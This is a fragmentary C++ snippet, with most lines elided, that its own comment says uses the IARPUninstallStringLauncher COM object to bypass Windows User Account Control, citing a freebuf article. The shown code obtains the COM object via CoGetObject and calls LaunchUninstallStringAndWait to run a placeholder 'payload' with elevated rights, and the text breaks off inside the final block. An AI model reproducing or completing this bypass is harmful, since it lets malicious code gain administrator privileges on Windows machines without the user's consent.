//Use to COM objects IARPUninstallStringLauncher to bypass UAC
//Reference:http://www.freebuf.com/articles/system/116611.html
...
int _tmain(int argc, _TCHAR* argv[])
{
	...
	hr =  CoGetObject(wszMonikerName, &bo, iid, &ppv);
	...
	if (SUCCEEDED(hr))
	{
			...
			{
				pfn_LaunchUninstallStringAndWait((LPVOID*)ppv, 0, L"payload", 0, NULL);
